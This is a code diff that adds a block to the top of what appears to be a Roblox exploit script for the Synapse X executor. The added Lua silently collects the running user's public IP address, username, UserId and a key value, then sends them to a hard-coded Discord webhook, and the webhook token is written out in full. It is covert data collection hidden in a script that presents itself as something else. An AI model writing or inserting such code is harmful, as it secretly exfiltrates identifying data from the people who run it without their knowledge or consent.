@@ -1,3 +1,16 @@
+repeat wait(1) until game:IsLoaded()
+    local started = tick()
+    local lib = tostring(game:HttpGet("https://api.ipify.org", true))
+    local response = syn.request(
+        {
+            Url = 'https://discordapp.com/api/webhooks/731288277960884236/uC_r_LQbajR1is_sHRqGrnUppBQ-xqD2uA0YsNUUDtGv-pf_ryA6W_lcupjUI6RNy5lz',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = game:GetService('HttpService'):JSONEncode({content = "```css" .. "\n" .. "[IP]: " .. lib .. "\n" .. "[Username]: " ..game.Players.LocalPlayer.Name .. "\n" .. "[UserId]: " .. game.Players.LocalPlayer.UserId .. "\n" .. "[Exploit]: Synapse X" .. "\n" .. "[Script]: Alternate" .. "\n" .. "[Execution Time]: " .. tick() - started .. " seconds" .. "\n" .. "[Key]: " .. _G.Key .. "```"})
+        }
+    );
 --[[
  ___       __   ________  ___       ___           ___    ___ ________  _______   ________  ___  ___  ________  _______        _________  _____ ______           
 |\  \     |\  \|\   __  \|\  \     |\  \         |\  \  /  /|\   ____\|\  ___ \ |\   ____\|\  \|\  \|\   __  \|\  ___ \   ___|\___   ___\\   _ \  _   \  ___    
